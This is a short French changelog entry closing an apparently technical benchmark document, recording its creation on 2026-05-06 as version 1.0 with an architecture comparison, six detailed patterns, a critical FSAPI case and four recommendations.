| 2026-05-06 | 1.0 | Création. Comparaison architectures, 6 patterns détaillés, cas FSAPI critique, points convergents et divergents, angles morts mutuels, 4 recommandations + 1 question critique sur le navigateur cible. |

---

**Fin du document benchmark.**
